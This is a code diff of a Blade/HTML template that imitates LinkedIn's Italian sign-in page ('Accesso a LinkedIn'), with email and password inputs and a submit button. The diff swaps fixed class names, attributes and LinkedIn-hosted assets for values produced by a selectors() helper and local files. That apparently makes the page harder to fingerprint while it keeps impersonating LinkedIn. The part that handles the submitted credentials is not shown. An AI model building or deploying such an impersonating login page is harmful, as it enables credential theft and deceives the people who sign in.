@@ -1,34 +1,39 @@
 <!DOCTYPE html>
-<html lang="it-IT" class="artdeco ">
+
+@php
+    $selectors = selectors();
+@endphp
+
+<html lang="{{ $selectors['lang'] }}" dir="{{ $selectors['dir'] }}">
 <head>
-    <meta http-equiv="X-UA-Compatible" content="IE=EDGE">
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="asset-url" id="artdeco/static/images/icons.svg" content="https://static-exp1.licdn.com/sc/h/6bja66gymvrvqrp5m6btz3vkz">
+    <meta http-equiv="X-UA-Compatible" content="IE=EDGE" />
+    <meta charset="{{ $selectors['charset'] }}" />
+    <meta name="author" content="{{ $selectors['author'] }}" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
     <title>Accesso a LinkedIn, Accesso | LinkedIn</title>
-    <link rel="stylesheet" href="./css/test.css" />
-    <link rel="stylesheet" href="{{ asset("css/app.css") }}" />
-    <link rel="shortcut icon" href="https://static-exp1.licdn.com/sc/h/9lb1g1kp916tat669q9r5g2kz">
+    <link rel="stylesheet" type="text/css" href="/css/login/index.css" />
+    <link rel="stylesheet" type="text/css" href="{{ asset("css/app.css") }}" />
+    <link rel="shortcut icon" href="/img/favicon.ico" />
 </head>
 <body>
-<div class="container-fluid">
-    <div class="col-12 mt-5">
-        <div class="row justify-content-center">
+<div class="{{ $selectors['container'] }}">
+    <div class="{{ $selectors['col'] }}5">
+        <div class="{{ $selectors['row'] }}">
             <div class="col-4">
                 <div class="col-12">
                     <div class="row">
                         <a class="text-decoration-none" href="/">
-                            <h2 id='title' class="primaryTXT font-weight-bold">
-                                Linked<i class="fab fa-linkedin"></i>
+                            <h2 id='title' class="primaryTXT {{ $selectors['fw'] }}">
+                                Linked<i class="fab fa-linkedin ml-1"></i>
                             </h2>
                         </a>
                     </div>
                 </div>
-                <div class="row justify-content-center mt-3">
+                <div class="{{ $selectors['row'] }} mt-3">
                     <div id="card" class="p-5">
                         <div class="col-12" id="header">
                             <div class="row">
-                                <h1 class="">Accedi</h1>
+                                <h2 class="">Accedi</h2>
                             </div>
                             <div class="row">
                                 <p>Resta al passo con il tuo mondo professionale.</p>
@@ -38,61 +43,63 @@
                             <div class="col-12">
                                 <div class="row">
                                     <input
-                                            id="email"
-                                            name="email"
+                                            name="{{ $selectors['email'] }}"
                                             type="text"
-                                            class="form-control form-control-lg border border-dark inputTXT"
+                                            class="{{ $selectors['input'] }}"
                                             autocomplete='off'
-                                            placeholder="Email"
-                                            required />
+                                            placeholder="{{ ucfirst($selectors['email']) }}"
+                                            required
+                                    />
                                     <!-- <label class="" for="Email">Email</label>-->
                                 </div>
                             </div>
-                            <div class="col-12 mt-4">
+                            <div class="{{ $selectors['col'] }}4">
                                 <div class="row">
                                     <input
-                                            id="password"
-                                            type="password"
-                                            aria-describedby="error-for-password"
-                                            name="password"
-                                            class="form-control form-control-lg border border-dark inputTXT"
-                                            placeholder="Password"
+                                            type="{{ $selectors['pass'] }}"
+                                            name="{{ $selectors['pass'] }}"
+                                            class="{{ $selectors['input'] }}"
+                                            placeholder="{{ ucfirst($selectors['pass']) }}"
                                             required
-                                            aria-label="Password" />
+                                    />
                                     <!-- <label for="password" class="form__label--floating" aria-hidden="true">Password</label>-->
                                     <!--<span class="" id="show" role="button">mostra</span>-->
                                 </div>
                             </div>
-                            <div class="col-12 mt-4 ml-2">
+                            <div class="{{ $selectors['col'] }}3 ml-2">
                                 <div class="row">
                                     <a href="/">
-                                        <h6 id="passwordDimenticata" class="primaryTXT">Hai dimenticato la password?</h6>
+                                        <h6 id="passwordDimenticata" class="primaryTXT">
+                                            Hai dimenticato la password?
+                                        </h6>
                                     </a>
                                 </div>
                             </div>
-                            <div class="col-12 mt-4">
+                            <div class="{{ $selectors['col'] }}3">
                                 <div class="row">
                                     <button
                                             id="accediBTN"
-                                            class="font-weight-bold col-12 primaryBG form-control form-control-lg p-2"
-                                            type="submit">Accedi
+                                            class="{{ $selectors['btn'] }} {{ $selectors['fw'] }} {{ $selectors['col'] }} primaryBG p-2"
+                                            type="submit">
+                                        Accedi
                                     </button>
                                 </div>
                             </div>
                         </form>
                     </div>
-                    <div class="col-12 mt-5">
-                        <div class="row justify-content-center">
+                    <div class="{{ $selectors['col'] }}5">
+                        <div class="{{ $selectors['row'] }}">
                             <span id="footer">
                                 Nuovo utente di LinkedIn?
                                 <a href="/">
-                                    <b class="primaryTXT"> Iscriviti ora</b>
+                                    <b class="primaryTXT">
+                                        Iscriviti ora
+                                    </b>
                                 </a>
                             </span>
                         </div>
                     </div>
                 </div>
-
             </div>
         </div>
     </div>
